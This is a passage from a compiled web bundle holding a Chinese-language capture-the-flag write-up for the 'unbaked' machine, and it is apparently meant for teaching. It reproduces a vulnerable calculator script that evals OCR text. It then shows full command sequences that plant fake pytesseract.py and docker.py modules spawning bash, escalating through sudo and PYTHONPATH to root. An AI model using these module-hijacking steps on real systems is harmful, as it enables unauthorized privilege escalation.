Calculator"\n        print "\\t\\t\\t","2. Easy Calculator"\n        print "\\t\\t\\t","3. Credits"\n        print "\\t\\t\\t","4. Exit"\n        print "\\t\\t\\t",28 * "-"\n\ndef instructions2():\n        print "\\n\\t\\t\\t",9 * "-" , "CALCULATOR!" , 9 * "-"\n        print "\\t\\t\\t","1. Add"\n        print "\\t\\t\\t","2. Subtract"\n        print "\\t\\t\\t","3. Multiply"\n        print "\\t\\t\\t","4. Divide"\n        print "\\t\\t\\t","5. Back"\n        print "\\t\\t\\t",28 * "-"\n\ndef credits():\n        print "\\n\\t\\tHope you enjoy learning new things  - Ch4rm & H0j3n\\n"\n\n# Function Arithmetic\n\n# Function to add two numbers\ndef add(num1, num2):\n    return num1 + num2\n\n# Function to subtract two numbers\ndef subtract(num1, num2):\n    return num1 - num2\n\n# Function to multiply two numbers\ndef multiply(num1, num2):\n    return num1 * num2\n\n# Function to divide two numbers\ndef divide(num1, num2):\n    return num1 / num2\n# Main\nif __name__ == "__main__":\n        print header()\n\n        #Variables\n        OPTIONS = 0\n        OPTIONS2 = 0\n        TOTAL = 0\n        NUM1 = 0\n        NUM2 = 0\n\n        while(OPTIONS != 4):\n                instructions()\n                OPTIONS = int(input("\\t\\t\\tEnter Options>>"))\n                print "\\033c"\n                if OPTIONS == 1:\n                        instructions2()\n                        OPTIONS2 = int(input("\\t\\t\\tEnter Options>>"))\n                        print "\\033c"\n                        if OPTIONS2 == 5:\n                                continue\n                        else:\n                                NUM1 = int(input("\\t\\t\\tEnter Number1>>"))\n                                NUM2 = int(input("\\t\\t\\tEnter Number2>>"))\n                                if OPTIONS2 == 1:\n                                        TOTAL = add(NUM1,NUM2)\n                                if OPTIONS2 == 2:\n                                        TOTAL = subtract(NUM1,NUM2)\n                                if OPTIONS2 == 3:\n                                        TOTAL = multiply(NUM1,NUM2)\n                                if OPTIONS2 == 4:\n                                        TOTAL = divide(NUM1,NUM2)\n                                print "\\t\\t\\tTotal >> $",TOTAL\n                if OPTIONS == 2:\n                        animation = ["[\u25a0\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1]","[\u25a0\u25a0\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a1\u25a1\u25a1\u25a1\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a0\u25a1\u25a1\u25a1\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a1\u25a1\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a1\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a1\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a1]", "[\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0\u25a0]"]\n\n                        print "\\r\\t\\t\\t     Waiting to extract..."\n                        for i in range(len(animation)):\n                            time.sleep(0.5)\n                            sys.stdout.write("\\r\\t\\t\\t" + animation[i % len(animation)])\n                            sys.stdout.flush()\n\n                        LISTED = pytesseract.image_to_string(Image.open(\'payload.png\'))\n\n                        TOTAL = eval(LISTED)\n                        print "\\n\\n\\t\\t\\tTotal >> $",TOTAL\n                if OPTIONS == 3:\n                        credits()\n        sys.exit(-1)\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u7531\u4e8e\u6587\u4ef6\u4f4d\u4e8e\u7528\u6237\u76ee\u5f55\u4e0b\uff0c\u800c\u4e14 ",(0,i.jsx)(n.code,{children:"pytesseract.py"})," \u6587\u4ef6\u53ef\u88ab\u5f53\u524d\u7528\u6237\u6240\u63a7\u5236\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a5\u7ba1"]}),"\n",(0,i.jsx)(n.p,{children:"\u90e8\u7f72\u6076\u610f\u8d1f\u8f7d"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import pty\n\npty.spawn("/bin/bash")\n'})}),"\n",(0,i.jsx)(n.h2,{id:"user---oliver",children:"User - oliver"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'(remote) ramsey@unbaked:/home/ramsey$ touch pytesseract.py\n(remote) ramsey@unbaked:/home/ramsey$ echo "import pty" > pytesseract.py\n(remote) ramsey@unbaked:/home/ramsey$ echo \'pty.spawn("/bin/bash")\' >> pytesseract.py\n(remote) ramsey@unbaked:/home/ramsey$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py\noliver@unbaked:~$ whoami\noliver\n'})}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-2",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"oliver@unbaked:~$ sudo -l\nMatching Defaults entries for oliver on unbaked:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser oliver may run the following commands on unbaked:\n    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801-1",children:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",metastring:'title="/opt/dockerScript.py"',children:'import docker\n\n# oliver, make sure to restart docker if it crashes or anything happened.\n# i havent setup swap memory for it\n# it is still in development, please dont let it live yet!!!\nclient = docker.from_env()\nclient.containers.run("python-django:latest", "sleep infinity", detach=True)\n'})}),"\n",(0,i.jsx)(n.h3,{id:"\u5c1d\u8bd5\u5229\u7528",children:"\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,i.jsxs)(n.p,{children:["\u7531\u4e8e\u8fd8\u662f\u76ee\u5f55\u53ef\u63a7\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a5\u7ba1 ",(0,i.jsx)(n.code,{children:"docker.py"}),"\uff0c\u4ece\u800c\u5b9e\u73b0\u63d0\u6743\u81f3 ",(0,i.jsx)(n.code,{children:"root"})]}),"\n",(0,i.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'oliver@unbaked:/home/oliver$ touch /tmp/docker.py\noliver@unbaked:/home/oliver$ echo "import pty" >> /tmp/docker.py\noliver@unbaked:/home/oliver$ echo \'pty.spawn("/bin/bash")\' >> /tmp/docker.py\noliver@unbaked:/home/oliver$ sudo PYTHONPATH=/tmp python /opt/dockerScript.py\nroot@unbaked:/home/oliver# whoami\nroot\n'})}),"\n",(0,i.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"CONGRATS ON PWNING THIS BOX!\nCreated by ch4rm & H0j3n\nps: dont be mad us, we hope you learn something new\n\nflag: Unb4ked_GOtcha!\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},99403:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20240211-231132-0c1c1959c9b024e1cafc3b5a722d110e.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>l});var i=t(67294);const r={},s=i.createContext(r);function l(e){const n=i.useContext(s);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),i.createElement(s.Provider,{value:n},e.children)}}}]);